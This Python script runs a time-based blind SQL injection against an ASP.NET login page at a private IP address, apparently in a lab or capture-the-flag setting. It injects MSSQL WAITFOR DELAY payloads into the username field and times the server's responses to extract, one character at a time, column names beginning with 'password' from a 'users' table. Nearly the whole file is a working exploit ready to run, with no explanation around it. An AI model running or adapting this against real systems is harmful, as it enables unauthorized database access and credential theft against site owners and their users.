import requests
import string
import time


url = "http://192.168.153.63:450/"
headers={
    "Content-type" : "application/x-www-form-urlencoded"
}

special_char = '''!#$^&*_+'''
listOfChars = string.ascii_lowercase + special_char



#column_name = "password"
final_column_name="password"


def check(char,payload):
    # print(payload)
    found_char=""
    data = {
        "__VIEWSTATE": "/wEPDwUKLTQ0NDEwMDQ5Mg9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUeSW52YWxpZCB1c2VybmFtZSBvciBwYXNza2V5Li4uZGRkikLoDB+/pXdQqiz9h+j5nHjE4OqEYro7hz/kDYh48fQ=",
        "__VIEWSTATEGENERATOR": "CA0B0334",
        "__EVENTVALIDATION": "/wEdAAQ5uNqOYHbIeyi7LRhe1+7mG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb69X6Gyh7W5UwTVXhfLT4lC/UYzzbo01YDuyOekjcuLek=",
        "ctl00$ContentPlaceHolder1$UsernameTextBox": payload,
        "ctl00$ContentPlaceHolder1$PasswordTextBox": "test",
        "ctl00$ContentPlaceHolder1$LoginButton": "Enter"
    }
    req = requests.post(url=url, headers=headers, data=data,proxies={"http":"http://127.0.0.1:8080"})
    spend_time=req.elapsed.total_seconds()
    if (spend_time > 19):
        print("[+] Found char: " + char + " payload:" + payload + "  spend_time: " + str(spend_time))
        found_char=char
        #column_name = column_name + char
        #print("[+]Current column_name:" + column_name)
    else:
        pass
        #print("[-]Not this char: " + char)
    #time.sleep(0.5)
    return found_char




status=200
while status==200:
    for char in listOfChars:
        payload = "test ' IF ((SELECT count(c.name) FROM sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name LIKE '" + final_column_name + "{}%')=1) waitfor delay '0:0:20'--".format(
            char)

        real_char=check(char,payload)
        if real_char != "":
            final_column_name=final_column_name+real_char
            print("[+] Current column_name: " + final_column_name)
        else:
            print("[-] No changed caused by '"+char+"'..")


'''

char="_"
payload = "test ' IF ((SELECT count(c.name) FROM sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name LIKE '" + final_column_name + "{}%')=1) waitfor delay '0:0:5'--".format(
    char)
print(payload)
final_column_name = final_column_name + check(char, payload)
print("[+] Current column_name: " + final_column_name)
'''
print("[+] Final result: "+final_column_name)


